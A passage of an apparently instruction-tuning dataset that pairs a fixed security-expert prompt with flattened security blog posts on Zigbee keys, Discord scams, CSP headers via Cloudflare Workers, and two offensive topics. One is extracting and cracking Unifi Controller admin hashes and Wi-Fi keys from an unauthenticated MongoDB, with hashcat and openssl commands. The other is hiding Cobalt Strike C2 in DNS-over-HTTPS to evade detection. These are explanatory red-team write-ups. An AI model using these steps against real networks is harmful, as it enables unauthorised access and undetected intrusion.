security uses a peer-to-peer key known as the link key Both devices must have already established this key with one another before sending APS-secured data There are two types of link keys trust center link keys and application link keys Trust Center Link Keys The trust center link key is a special link key in which one of the partner devices is the trust center The stack uses this key to send and receive APS command messages to and from the trust center The application may also use this key to send APS-encrypted data messages All devices in a Zigbee network must have link keys In a"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hacking Unifi Controller Passwords for Fun and WIFI</title>\n<taxonomies>Author, How-To, Informational, Kent Ickler, Kent Ickler</taxonomies>\n<creation_date>Thu, 21 Oct 2021 16:41:56 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler Because you know that should be a thing TL DR Don't run the Unifi Controller on a laptop in the closet BACKGROUND Ubiquiti's Unifi controller is a network device or software service that controls Ubiquiti's Unifi line of devices Unifi is a brand of devices that well unify together to make a better user experience for network users and system admins in the SMB arena We'll leave that up to your own opinion but we've used the devices and they work alright DISCLAIMER I'm not here to comment on the controller's software design from a security perspective Ubiquiti pays security experts to do that That's not me or BHIS And that's OK What I will tell you is this A compromised Unifi Controller host is a compromised Unifi network HACKERS GONNA HACK Unifi cloud-enabled devices got popped awhile back Thought I should mention it rebsonsecurity.com 2021 03 whistleblower-ubiquiti-breach-catastrophic Enough of that LOCAL CONTROLLER The local Unifi Cloud Controller can be installed on a Linux or Windows system if you didn't want to buy their Cloud Key hardware controller tore.ui.com products unifi-cloudkey It's awesome that they provide a downloadable controller to Unifi equipment owners This allows for a centralized install and administration of local Unifi devices without having to purchase an additional piece of software or hardware Download link ww.ui.com download unifi In fact it's so awesome and versatile it's like they want us to install it on an old random laptop that we don't actively use and will completely forget is running CONTROLLER DESIGN The back-end database for the controller is running a MongoDB database While the database server only listens to the loopback address of the host it is installed on it doesn't require authentication Again I'm not commenting on that LOOPBACK PORT FORWARDING Those in infosec know that loopback addresses are only as secure as the system that operates them In the grand scheme of things if the host running the controller is compromised it would be trivial to get remote access to the Unifi Controller using the loopback address without having remote desktop or console access For demonstration purposes I'm jumping straight to the host via RDP to snag some easy screenshots NO SQL I'd normally use DBeaver beaver.io for this type of thing A while back DBeaver removed their No-SQL and MongoDB drivers from the Community Version Bummer NOSQLBooster osqlbooster.com is a stand-in replacement that works great After starting NOSQLBooster you'll need to connect to the local database DRAKE MONGODB PORT HOTLINE No MongoDB here Even without Drake this loopback obfuscated port wouldn't have been hard to find with some cmd-fu But Ubiquiti was kind enough to fully document it too elp.ui.com hc en-us articles 218506997-UniFi-Ports-Used GET CONNECTED In NOSQLBooster click on Connect followed by Create Enter the details Type Single Server Server localhost Port 27117 Name Unifi Next press Save and Connect The database structure will open on the left side of the application THE GOOD HACKERY STUFF Let's drill down to Unifi ace admin Double click admin to open the associated records Notice the x_shadow key It looks awfully like a hashed password Spoiler It is Let's snag that key and do some magic STOP HASHER TIME Dance to this and you're gonna get thinner 6 KPCNpIC GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B e0Ckp.57Q8UiWw32sM60 Let's dissect that hash By analyzing the hash with the modular-crypt-format asslib.readthedocs.io en stable modular_crypt_format.html we can identify its individual parts That syntax for this type of hash id salt encrypted First the id 6 tells us we are looking at some sort of variation of SHA512-crypt The text between the 6 and the next is the hash salt KPCNpIC There are some amusing bits about that salt we'll discuss later After the salt and is the cryptographic hash of the password salt GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B e0Ckp.57Q8UiWw32sM60 I SMELL PENGUIN Notably this is a common hash type in Linux shadow files Cleverly we found the hash in a key named x_shadow Those of you that know Linux already identified the hash as a salted sha512crypt hash Hashcat nerds like me already know that this is mode 1800 CRACK HASH GET POT Get on with it First we throw that hash into a file named hash and then start up Hashcat Hashcat will attempt to find a hash collision and if it does will output the collision in a file named pot We use the -m flag with Hashcat to specify the hash type and the -a flag to specify our attack mode in this case a direct dictionary attack echo 6 KPCNpIC GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B e0Ckp.57Q8UiWw32sM60 hash hashcat -m 1800 -a 3 hash wordlist -o pot That's a hit You sunk my controller-ship Let's grab the collision from the potentials file cat pot 6 KPCNpIC GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B e0Ckp.57Q8UiWw32sM60 Fall2021 The password is Fall2021 ADMIN LOGIN TIME You can now login to the Unifi Controller at ocalhost 8443 with the username specified in the ace admin key name with the cracked password In our case Fall2021 It's haxed Mi Hash Su Hash Let's talk about salts and hash To have a little fun with this and to prove a point about non-filtered salts let's create our own hash We will use openssl to generate a SHA512-crypt hash However we will use our own custom salt a salt that Unifi should know it never used to store an actual user account credential openssl passwd -6 -salt BHISWASHERE Fall2021 6 BHISWASHERE M.ngiEju5sTwrsxbs3gRK Ok.mp948HNn5x1PrB6UK3q 3acozGjEQtVSRZ4KUBmU02iI.TdJGhqNBj4ttbzI1 To reset that Unifi Controller admin password we need only overwrite the x_shadow key in the ace admin table with our new hash 6 BHISWASHERE M.ngiEju5sTwrsxbs3gRK Ok.mp948HNn5x1PrB6UK3q 3acozGjEQtVSRZ4KUBmU02iI.TdJGhqNBj4ttbzI1 The login password will then be a very secure Fall2021 The salt isn't filtered and it will work to login to the controller SALTY PADME So the salt doesn't matter It's not filtered Big deal Sorry Padme Imagine a runtime computed salt that is a derivative of an account attribute like creation timestamp plus device GUID that never gets stored but rather only re-computed at authentication At authentication time the user submits a password which is then added to the runtime-computed salt that is a derivative of the user's account creation time plus the device GUID Since the salt would never be stored a hacker would never be able to correctly produce and inject an external hash into the authentication database But I'm an idealist WHAT ELSE Well aside from interesting things like the payment table where you find payment details for the Hot Spot Unifi service there are other tidbits that might wet your whistle too The devices table has all you wanted to know about how the controller talks to the devices including authentication The alert table will have network metadata alerts You could watch as users walk around a building In the users table you will find meta-data for every network device that the controller tracks data for basically anything any controlled Unifi device sees in its network broadcast In the settings table you'll find other juicy tidbits including the authentication and API information to Unifi's Cloud Controller service Bottom line Every setting in the controller can be enumerated SMTP configurations SYSLOG SNMP etc If it's a stored credential in the controller you now own it Cough IPSEC VPNs cough I CAME HERE FOR FREE WIRELESS If logging into the dashboard wasn't your thing you can always just pull the wireless pre-shared keys directly out of the database without logging into the controller interface If you look in the wlanconf table you'll find treats like name and x_passphrase that are the plaintext SSID and pre-shared key respectively Remember this is accessible even if the controller device itself cannot see the wireless network Let's be honest if you've gotten this far spaghetti and plaintext pre-shared keys are the least of your concerns CONCLUSION Frankly this all started because I forgot my admin password on my local controller at home Whoops Red Teamers Check for a Unifi Controller on your target endpoints It may make an easy win HOT TAKES Is the Software Unifi Controller insecure No I mean yes Maybe If the host that runs the Unifi Controller becomes compromised the network is compromised Any external service that was configured in the controller and potentially a linked Unifi Cloud account should be considered compromised and keys changed But then again the host that runs this software should probably be better known as the Unifi Controller and protected as though it's the Unifi Controller Don't use a random laptop thrown in the back of a closet because you didn't want to buy the Cloud Key hardware controller By the way compromise doesn't mean SYSTEM context here Remember MongoDB is running without authentication You only need local loopback privilege even remotely to modify the database Could it be more secure Yes definitely But remember how the pendulum swings both ways another extreme All the sensitive bits could be protected with PKI infrastructure controlled by Ubiquiti That would be better right GetOffMYLawnAlexa Isn't SHA512cyrpt broken anyway Ehh sure here's some math three.org 2018 05 23 do-not-use-sha256crypt-sha512crypt-theyre-dangerous Did I contact Ubiquity No This is by their design I'm not even mad As a systems administrator I acknowledge this behavior would be consistent with other manufacturer network controllers not installed on Windows For example a console cable can give you root privileges on a switch with nothing more than physical access but you have that switch locked in a secure facility This only appears bad because of the perception that it's OK to install the software on any Windows host including a personal-use laptop The network controller here leverages the security of the host itself When you install this software the device becomes a network controller and you need to secure it like one Don't install network controller software on vulnerable devices The only thing I'd say more is that the ease of install may have trivialized the security considerations of operating the controller or at least the considerations used in the decision to install on a specific device These products really do just work and consequently it becomes easy to forget the security implications of how they just work Can you automate Unifi stuff Yes but this guy did it first ithub.com MichaelMcCool Unifi BETTER SECURITY FOR SOFTWARE UNIFI CONTROLLER Did you know that after your Unifi devices are configured they never need to talk to the controller Just turn off the service after your devices are configured The configuration on the devices will survive reboots and your mesh shouldn't be impacted If a few years later you turn on the controller and find you've forgotten the password you'll find this blog post and can just change it hacker-style THE MORAL OF THE STORY Real friends don't let kids play Roblox on network controllers RESOURCES Unifi Cloud Compromised rebsonsecurity.com 2021 03 whistleblower-ubiquiti-breach-catastrophic UniFi Controller ww.ui.com download unifi UniFi Ports elp.ui.com hc en-us articles 218506997-UniFi-Ports-Used Modular Crypt Format asslib.readthedocs.io en stable modular_crypt_format.html modular-crypt-format API Wrapper for Unifi GUI ithub.com MichaelMcCool Unifi NOSQLBooster osqlbooster.com DBeaver beaver.io"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Not Get Scammed on Discord</title>\n<taxonomies>Author, How-To, Informational, Max Boehner, Noah Heckman, Phishing</taxonomies>\n<creation_date>Mon, 08 Nov 2021 22:02:46 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Max Boehner Noah Heckman Introduction As 2020 sent us all into our homes social distancing the demand for online messaging saw a huge spike in an effort for people to stay in contact with each other In some cases even entire social events like conferences and club meetings were ported to platforms such as Discord and Slack to increase biological security while still allowing individuals to meet and communicate with each other But like all things when the user base moves so do the actors who will try to take advantage of them Since Black Hills Information Security BHIS has a vested interest in Discord we wanted to write this blog to provide an overview of currently common attacks against Discord users that we are seeing and how to protect yourself from them User Account Takeover During our research we found that one of the most common goals of social engineering on Discord is the takeover of legitimate Discord user accounts To understand the motives behind those attacks it is important to understand the value of these accounts and what attackers are using them for After all why would the attackers not simply create new accounts instead of going through the trouble of compromising those of others While researching this topic we learned about the value of existing accounts first-hand To learn more about Discord phishing we actively tried to become targets of such attacks We created Discord burner accounts and joined servers on various topics that might attract scammers However we noticed that many Discord servers have hurdles in place that make it more difficult for users to join While some servers only allow user accounts with verified phone numbers others require solving small challenges to prove the user is not a bot such as reacting to a specific message In one case we were even vetted in a discussion with an administrator who also inquired about the short lifetime of our account Compromising existing user accounts can aid attackers in circumventing these server protections since existing accounts will often be members of servers already Access to such servers gives them the opportunity to post phishing messages within the chat rooms or to send direct messages to other server members What makes this even more effective for social engineering is the fact that Discord servers are often dedicated to a specific topic such as gaming cryptocurrencies or information security This allows attackers to craft their message pretexts with a specific audience in mind increasing the chance of success For example members of a Discord server related to cryptocurrency may be more susceptible to phishing messages related to that topic than others Similarly members of a gaming Discord server are excellent targets for attacks aimed at taking over accounts for gaming platforms such as Steam Additionally existing users will often have contacts within Discord that may be more likely to trust them thus increasing the chance of success for further social engineering attacks These further attacks can either be aimed at compromising more Discord accounts or at achieving additional goals such as financial gain We will discuss typical end goals of these account takeover campaigns later on in this blog Now that we have established the value of legitimate Discord accounts we will provide some examples of common ways attacks are conducted Here we found that phishing for Discord accounts typically uses pretexts related to Discord A social engineering technique that has been discussed in the past for example in this Portswigger blog post ortswigger.net daily-swig discord-users-warned-over-qr-code-login-scam-that-can-result-in-pwned-accounts involves the Discord's QR code login function For this to work the victim needs to be logged in to the Discord mobile app on their phone An attacker will then send the victim a QR code obtained from the Discord login page and attempt to trick the victim into scanning it with their app If the victim scans the QR code they will be prompted to confirm that they want to log in If the Yes log me in button is pressed the attacker is logged into the victim's account Discord has acknowledged these QR code attacks and shortened the validity period of QR codes to two minutes to reduce the likelihood of success upport.discord.com hc en-us articles 360039213771-QR-Code-Login-FAQ However within these restrictions the attack is still possible in the way described above Our research indicates that some of the most common account takeover attacks are related to free Discord Nitro subscriptions Discord Nitro is a paid subscription which offers additional features to Discord users These include more detailed profile pages additional emojis and stickers bigger file uploads and so on These features are desirable enough to many users that the offer of free Nitro has become a quite successful social engineering pretext One factor that may aid attackers here is that legitimate Nitro giveaways have happened in the past On top of that a legitimate way to gift Discord Nitro to other users exists which generates a link pointing to the discord.gift domain source upport.discord.com hc de articles 1500001829622-Claiming-a-Nitro-Gift-FAQ Users who know about these legitimate giveaways may be more inclined to react to social engineering attacks that mimic these giveaways These phishing attacks can take various forms They may for example entice the user into opening a link to an attacker's website that prompts the user to log in with their Discord credentials potentially providing the attacker with access to the user's account One way to trick users into thinking a link is legitimate is through typosquatting a domain that appears to be related to Nitro gifts Those can either be targeted at Discord account takeover or at the takeover of third-party platform accounts We will provide an example of the latter in the next section Steam Account Takeover A popular variant of this attack method uses the promise of free Nitro access to compromise Steam accounts Steam is a popular gaming platform used by millions of players It also includes marketplace and trading features that can be used to buy sell and trade virtual items from games as well as a wallet feature that lets users store funds Attackers who compromise Steam accounts may be able to gain a direct financial benefit from doing so Steam forums and communities like Reddit contain numerous reports of users who have suffered from account takeovers after falling for similar Discord Nitro phishing attacks The outline below provides an example of such a phishing attack The attack starts with a message sent to users containing a typosquatting link The page that is opened attempts to mimic the look of the official discord.com website Many of the links contained even point back to the valid Discord domain in an attempt to make the site look as legitimate as possible Clicking the Get Nitro button opens a login page that is visually similar to the Steam login page However this page is also hosted on the steamdlscord com domain suggesting that this is aimed at capturing Steam credentials If the account takeover is successful the attackers may attempt to trade off any valuable items in the account inventory or use the account's wallet balance to buy game gift codes While account recovery from this is typically possible those efforts may not be able to restore any lost valuables Another dishonorable mention in the Steam account takeover category involves scammers messaging victims on Discord that they have accidentally reported them for abuse on Steam and now the victim must take action to prevent their account from being banned An important part of the pretext here is that the victim has linked their Discord and Steam accounts providing a very useful piece of information to the attacker allowing them to create a more believable pretext This blog describes this technique in detail log.malwarebytes.com scams 2021 03 steam-users-dont-fall-for-the-i-accidentally-reported-you-scam Cryptocurrency Scams Cryptocurrencies are another commonly used topic within social engineering attempts on Discord While they are expectedly quite common on servers related to this topic they are also prevalent on unrelated servers While the pretexts and delivery methods can vary the end goal is always the same gaining a financial benefit at the expense of unsuspecting victims The following message shows an example that attempts to get the victim to visit a seemingly legitimate cryptocurrency change website under the guise of a Bitcoin giveaway The messenger offers a promo code that promises 0.42 BTC Bitcoin as a giveaway At the time of this writing that is equivalent to approximately 20k USD That sounds too good to be true right The scammers have made great efforts to make the target site appear like a legitimate crypto exchange When scanning the site via urlscan.io an interesting observation can be made though There appear to be a large number of similar other sites available Visually the only difference between these sites is their domain name as well as the name displayed on the site From this point forward the victim would need to register to this trading site to enter the promo code We did not investigate further into this specific site but based on other research we suspect that the next steps would have asked us to pay a fee to unlock the 0.42 BTC without the promised Bitcoin ever being paid afterwards For further explanation of this scam please have a look at this video outu.be R7WL_xFF0R8 Another common social engineering technique that we observed includes sending Discord server invite links via direct messages or other server chat rooms While inviting users to new servers is not directly malicious it can function as a precursor to later social engineering attacks We received the following message inviting us to a cryptocurrency arbitrage trading server promising free money via arbitrage between different trading platforms This particular attack appears to revolve around victims being coerced into buying cryptocurrency from a legitimate trading site and then sending it to a fraudulent one Malware Distribution via Discord Oftentimes used along with the methods above there has been a multitude of reports regarding malware distribution via Discord There are several contributors as to why this works specifically well with Discord vs other platforms One of the main reasons is due to Discord having a universally available worldwide content delivery network CDN Intended to allow users to share files and pictures back and forth this service allows attackers to host malware on trusted servers owned by Discord When files are uploaded to Discord it will upload them to the service which is hosted at cdn.discordapp.com While CDN abuse is not new when paired with spear phishing this may convince some users that this file is coming from a trusted source This also means that for any users employers who are running access control lists ACL's blocking commonly abused sites such as GitHub or Pastebin the attackers may be able to bypass said protections if you allow traffic to Discord's CDN service Malware Targeting the Discord Client Of course that example requires the user to download and execute the file stored on the CDN There are historically easier methods however In 2020 Masato Kinugawa published a blog post regarding a full exploit chain on the Discord client to achieve remote code execution by simply having the end user click on an iframe causing a 3d project file hosted on sketchfab to render and execute NodeJS code Discord is built on Electron which can allow the web application to access local system resources bypassing some of the sandboxing features which have become a staple in the security of the modern web browser While the client may be a convenient way to access the chat application it may not be your safest option Another notable element in the exploit chain was the exploit of Discord's iframe embedding in its web application While this feature can be disabled in the user settings it is enabled by default Another notable Discord malware known as BlueFace was found by MalwareHunterTeam and reported by bleepingcomputer.com back in 2019 when malware was discovered to be modifying the JavaScript for the application to weaponize the client and exfiltrate information to the attacker These examples show that the Discord client is actively being tested for exploits that are specifically related to its use of Electron Depending on your threat model you may want to consider disabling this though it will come at the expense of breaking all those fantastic gifs in your chat Even better still consider accessing Discord via a web browser instead of the Electron app if possible Protections and Countermeasures The best protection against social engineering attacks is knowing that they can occur and staying suspicious of messages links or server invites This will also be the last line of defense if all other preventative measures fail and a malicious message gets through to the user To lower the likelihood of such messages appearing there the following settings can be configured by users Safe Direct Messaging This will scan all images and videos sent to the user via direct messages and block potentially undesired content While not directly aimed at preventing phishing this may help filter out malicious messages in some cases We recommend choosing either the top or middle option Server Privacy Defaults This option sets the default value for allowing direct messages from users that have at least one common server with the user Disabling this option will reduce the risk of receiving phishing messages This option can also be set on a per-server basis by right-clicking on a specific server We recommend setting the default value to disabled and enabling direct messages only for servers that you trust Who Can Add You as a Friend This option defines who can add you as a friend in Discord Any user that you add as a friend will be able to send you direct messages regardless of setting 2 Disabling the Everyone option can help prevent social engineering attacks but may also prevent legitimate friend requests For added security disabling the Server Members setting is also an option To reduce the likelihood of successful account hijacking attacks we recommend enabling Two-Factor Authentication While this does not protect against the QR code attack described above it can reduce the impact of other credential-stealing attacks Using Discord from within a web browser as opposed to the Desktop application for added security was already mentioned earlier However if you choose to use the Desktop application we recommend checking that the feature Automatically detect accounts from other platforms on this computer is disabled Additionally we advise you not to connect accounts from other services such as Steam or Twitch to your Discord account Having other accounts connected may give attackers additional information that can be used for social engineering attacks This practice is also good for privacy On top of measures that can be taken by individual users there are also ways for server admins to improve security Please refer to this official Discord documentation page for more information iscord.com safety 360043653152-Four-steps-to-a-super-safe-server Summary We wrote this blog with the intention of providing an overview of currently common attacks against Discord users We showed that attackers are often using Discord to target specific user groups such as Steam users or cryptocurrency enthusiasts and may be using the Discord platform itself to host malicious files for their attacks Knowing about the prevalence and different variants of social engineering attacks can help strengthen users security posture To follow up we have provided a list of mitigations and instructions on how users can implement them to reduce the likelihood of falling victim to such attacks However like most phishing and social engineering attacks vectors it often comes down to the vigilance of each individual user to avoid falling victim"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>DNS Over HTTPS for Cobalt Strike</title>\n<taxonomies>Author, Informational, InfoSec 101, Kyle Avery, Red Team</taxonomies>\n<creation_date>Wed, 17 Nov 2021 19:45:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kyle Avery Introduction Setting up the C2 infrastructure for red team engagements has become more and more of a hassle in recent years This is a win for the security community because it means that vendors and professionals have learned from previously successful techniques and implemented effective mitigations in their networks DNS over HTTPS is an underappreciated channel for command and control This blog will show you how to utilize DoH with Cobalt Strike in a way that requires no third-party accounts or infrastructure setup encrypts traffic with a valid SSL certificate and sends traffic to reputable domain names Existing Techniques Attackers and offensive security professionals have been using different redirector implementations for some time The first redirectors that I used were simple Apache and Nginx servers configured with various rules to forward traffic based on predefined criteria Redirectors are great for making infrastructure more resilient but they can also bypass defenses that rely on domain categorization For example once Content Delivery Networks CDN became more accessible to developers attackers moved from traditional redirectors to these platforms because they often provide a valid domain name and even SSL certificate to the user reducing the work of an attacker A technique known as domain fronting was later discovered and used heavily by many testers More recently however CDN providers have been cracking down on this behavior Many sites prevent domain fronting entirely or actively search for those using it Microsoft in particular has been known to shut down Azure Subscriptions in the middle of our operations I have recently turned to other cloud services such as Azure App Services and Cloudflare Workers for traffic redirection These have the same benefits as traditional CDNs but are less heavily monitored While these services work well cloud providers could decide to start watching these with the same dedication as they watch CDNs any day DNS over HTTPS Traditional DNS Beacons are relatively straightforward to detect I have never used the Cobalt Strike DNS listener on an operation limiting me to the previously described HTTPS listener and redirectors DNS over HTTPS for Beacon provides us reputable domains and valid SSL certificates without needing an account or any configuration of the redirector This reduces an operator's setup time even further and eliminates the risk of account shutdown Today's Topic DNS over HTTPS for Cobalt Strike The use of DNS over HTTPS was first presented to me on Twitter by Austin Hudson His tweets over the last year detailed his progress towards this capability and resulted in an open-source tool TitanLdr This Cobalt Strike user defined reflective loader UDRL hooks the Cobalt Strike Beacon's import address table IAT to replace the API call responsible for making traditional DNS queries DNSQuery_A with a function that makes DoH requests to dns.google 8.8.8.8 and 8.8.4.4 This alone is an excellent capability but TitanLdr's DNSQuery_A hook is generic enough to work with many different DoH servers I have tested the following domains and confirmed that they work as drop-in replacements dns.quad9.net mozilla.cloudflare-dns.com cloudflare-dns.com doh.opendns.com ordns.he.net Using TitanLdr TitanLdr is the key to integrating this capability into Cobalt Strike You can grab the original TitanLdr which beacons to a single DNS provider over HTTPS server here ithub.com secidiot TitanLdr You can change the DNS server on line 111 of the DnsQuery_A.c file in the hooks directory Line 111 in TitanLdr hooks DnsQuery_A.c Original Repository I have since forked TitanLdr to allow for multiple DoH servers to be specified Each time a callback is made the Beacon will randomly select one from a hardcoded list If you want to use multiple DoH servers you can download my fork here ithub.com kyleavery TitanLdr You can modify the list of servers at line 116 of the DnsQuery_A.c file in the hooks directory Line 116 in TitanLdr hooks DnsQuery_A.c Forked Repository Once downloaded you will have to build the program This will require a Linux host with NASM and MinGW installed Once you have these programs run the make command to create the necessary files Building TitanLdr Import the Titan.cna Aggressor script into Cobalt Strike and you are ready to use DoH Configure a DNS listener as you usually would The Cobalt Strike documentation goes more in-depth on configuring this listener Configuring a DNS Listener Once the Beacon is running we can see that only one DNS request is made to resolve the DoH server address Afterward all of the traffic is encrypted HTTPS DoH Beacon Network Traffic Drawbacks of DNS over HTTPS We've already discussed the benefits a DNS over HTTPS Beacon has over a traditional HTTPS Beacon but there are also some definite drawbacks First more packets are needed to communicate the same information back to the team server A DNS TXT record can only contain a maximum of 255 characters meaning we can only send a small amount of data in each packet Second we have no control over the path or domain names of available servers It seems easier for an environment or appliance to deny outbound 443 TCP to the list of popular or known DoH servers than block Microsoft's .azurewebsites.net or Cloudflare's .workers.dev You could solve this by using more obscure DoH servers or by building your own and categorizing them over time depending on how the environment is configured Potential Detection Methods Current detection techniques may have gaps when it comes to detecting DNS over HTTPS Current detections targeting malicious HTTPS traffic typically utilize domain reputation rendering them potentially ineffective against DoH since the domains in use are reputable Current detections targeting malicious DNS traffic typically monitor for many DNS requests rendering them potentially ineffective against DoH since the traffic is no longer using the DNS protocol A combination of traditional DNS monitoring and SSL inspection could be a potential solution but I do not know of any current tools or products that do this My understanding is that the primary defense against this attack is blocking outbound 443 TCP to known DoH servers that an organization is not using Most networks I encounter still use traditional DNS often with a local DNS server running as part of the Active Directory environment In this case there is no need to allow HTTPS traffic to dns.google cloudflare-dns.com or any others mentioned in this post Closing Thoughts There are absolutely more DNS over HTTPS servers that could be used with this configuration In addition the user could set up their own DoH server maybe even behind a CDN or other cloud service to introduce a variation on this technique TitanLdr is limited to Cobalt Strike but the DoH implementation could be ported to any other C2 framework This method will not be the best in every scenario but it is another tool in the toolkit that I hope you can take advantage of Feel free to contact me with any questions or comments on Twitter kyleavery_ Credits The idea to use DNS over HTTPS for C2 comes from the work of Austin Hudson This technique and blog would not have happened without his TitanLdr project Austin's code and tweets have inspired many of my personal projects I highly recommend following him I mentioned that I currently use two redirector services for traditional HTTPS Beacons Azure App Services and Cloudflare Workers I originally discovered these techniques at the following two links jpc500.github.io c2 Using-CloudFlare-Workers-as-Redirectors ithub.com bashexplode cs2webconfig"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Fixing Content-Security-Policies with Cloudflare Workers</title>\n<taxonomies>Author, How-To, Informational, Kent Ickler, Content-Security-Policy, Kent Ickler, Permissions-Policy, Referrer-Policy, Security Headers, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options</taxonomies>\n<creation_date>Fri, 03 Dec 2021 18:31:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler Background Over four years ago now I wrote a blog post on fixing missing Content-Security-Policy by updating configuration on webservers ww.blackhillsinfosec.com fix-missing-content-security-policy-website Content-Security-Policies instruct a user's web browser how it should behave on certain security considerations Oh how times have changed Here at Black Hills Information Security BHIS we've actually migrated webservers hosting companies security platforms that list goes on and on The best practices for Content-Security-Policies have changed in the last four years too On our new hosting platform we need to set up appropriate content security headers again Since we now use Cloudflare for our CDN and WAF provider we have some new opportunities for fronting our Content-Security-Policies outside of the web server itself Initial Testing Before you go about updating your Content-Security-Policies it's good to have a clear picture of how your server currently handles sends Content-Security-Policies A good way to test this configuration is to use a third-party tool We can use SecurityHeaders.io to scan our website's Content-Security-Policy configuration Link ww.securityheaders.io In the case below we've had SecurityHeaders.io scan the WildWestHackinFest.com website That looks bad right Well maybe It is important to note that Content-Security-Policies are used to instruct the browser how to handle security concerns within the browser This is critical on websites where there is user interaction and sensitive information being disclosed For example it would be imperative that a banking website health records portal or other user-interaction service have appropriate Content-Security-Policy headers In the scenario where there is no user interaction or no sensitive information disclosed it becomes less imperative that Content-Security-Policies be configured in a very secured state Here's a good example of a not-great configuration scenario The US Social Security Administration has a portal where users can login and access sensitive information about their account The portal login landing page is ecure.ssa.gov Alright so that's a picture of what not to do If you're looking to correct some of these issues you have a couple methods afforded to you The first is to read the blog from four years ago that demonstrates how to fix the issue by configuring your web server with the appropriate Content-Security-Headers But there is another way Cloudflare Workers Link orkers.cloudflare.com Cloudflare Workers are a serverless section of server-side-JavaScript that can perform actions or modify web traffic associated with a Cloudflare CDN WAF protected site In the case of our earlier example ildwesthackinfest.com is a website that is served by the Cloudflare network This allows us to use the Cloudflare Workers service to manipulate web traffic without having to update the backend origin web servers associated with the website BHIS operates multiple websites and using Cloudflare Workers will also allow us to centralize the response-header manipulation to one programmatic location rather than managing multiple backend server configuration Prerequisites To allow a Cloudflare Worker to manipulate your web server's traffic you must ensure that the webservice has Orange Cloud configuration on Cloudflare You must also enable the Workers service After logging into Cloudflare and selecting your domain click on the Workers tab to get the service initiated Building the Worker Once you have Cloudflare Workers enabled on the Workers tab click on Manage Workers and then Create Service Give your new worker a name and select HTTP Handler as the starter template Then find the Quick Edit button to access the Cloudflare Worker editor IDE Next replace the existing template code with the following worker code Link ithub.com Relkci cf-worker-header-injector blob main worker.js addEventListener 'fetch event event.respondWith handleRequest event.request async function handleRequest request let originalResponse await fetch request pass in the original response so we can modify some of it let response new Response originalResponse.body originalResponse response.headers.set 'X-Frame-Options 'SAMEORIGIN response.headers.set 'Referrer-Policy 'same-origin response.headers.set 'Content-Security-Policy 'default-src 'self 'unsafe-inline response.headers.set 'Feature-Policy 'camera 'none geolocation 'none response.headers.set 'X-Content-Type-Options 'nosniff response.headers.set 'X-XSS-Protection '1 mode block response.headers.set 'Permissions-Policy 'camera geolocation microphone return response The above is a starter template for Content-Security-Policies You should configure each policy as you see fit for your website Any headers you add here will later be added to your web server's HTTP Responses Press Save and Deploy Don't worry nothing is live yet In the next step we will associate the new Cloudflare Worker with your website After we do this your worker will begin intercepting HTTP responses from your backend origin web server and injecting the headers specified in the worker code Apply the Worker After you have your worker saved return to the Cloudflare Workers tab associated to your domain and press Add Route The Add Route functionality associates your new worker with your web server As soon as this is done your backend origin web server's HTTP responses will be intercepted by the worker and the worker will inject the headers according to its code After the worker has been routed with your website you'll find the Workers tab now lists the active routes Content-Security-Policy Refinement As soon as you associate the worker remember that restrictive Content-Security-Policy settings may break rendering or functions of your website if you use JavaScript CSS or external resources The Content-Security-Policy instructs the browser which resources are safe to load A restrictive policy may prevent the loading of necessary resources As you update your Content-Security-Policy for your website you may see errors or rendering issues that are related to the new Content-Security-Policies The easiest way to identify the Content-Security-Policy violations is to use the browser's developer mode typically press F12 The Network or Console tabs will typically alert you to violations that will need to be accounted for in the Content-Security-Policy Here's an example of a console error This error lets us know that within the script-src setting in the CSP the stats.wp.com is not explicitly trusted There are various ways we can go about adding trust for this source one method is to add tats.wp.com to the script-src setting After updating and re-deploying the worker refresh and you should see that the resource was allowed to load and consequently did not present an error in the developer console Worker Pricing One last note regarding the addition of the Workers service and the creation of the Worker later Cloudflare does provide a free tier to workers and two different price schemes Bundled and Unbound If you're worried about what that might cost you we were too We used the Unbound pricing 